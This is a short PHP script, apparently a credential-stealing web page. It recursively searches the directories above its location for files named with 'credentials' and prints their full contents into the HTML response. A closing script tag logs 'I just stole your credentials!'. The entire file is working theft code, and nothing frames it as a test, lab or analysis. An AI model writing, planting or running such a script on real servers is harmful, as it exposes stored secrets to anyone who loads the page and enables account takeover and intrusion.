<?php

// Function to recursively search for files containing 'credentials' in their name
function search_files($dir, $pattern) {
    $files = [];
    $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir));

    foreach ($iterator as $file) {
        if (strpos($file->getFilename(), $pattern) !== false) {
            $files[] = $file->getPathname();
        }
    }

    return $files;
}

// Searching the parent directory for files with 'credentials' in their name
$searched_dir = dirname(dirname(__DIR__));
$found_files = search_files($searched_dir, 'credentials');

// Display the content of the found files
foreach ($found_files as $file) {
    echo "<h2>Contents of {$file}</h2>";
    echo "<pre>" . htmlspecialchars(file_get_contents($file)) . "</pre>";
}
?>
<script>
    console.log('I just stole your credentials!');
</script>
